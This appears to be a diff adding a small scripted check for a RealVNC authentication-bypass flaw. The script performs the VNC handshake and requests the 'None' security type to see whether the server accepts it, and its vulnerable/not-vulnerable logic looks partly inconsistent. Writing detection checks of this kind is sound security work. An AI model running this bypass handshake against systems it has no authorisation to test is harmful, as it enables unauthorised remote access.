@@ -1,0 +1,15 @@
+#check for real vnc authentication bypass
+
+option 'host','localhost'
+option 'port','80'
+
+version=read 12
+write version
+types=read 1
+types=unpack types,'C'
+read types
+check=read 4
+puts "not vulnerable" if unpack check,'I'
+write "\x01"
+check=read 4
+puts "not vulnerable" unless unpack check,'I' 
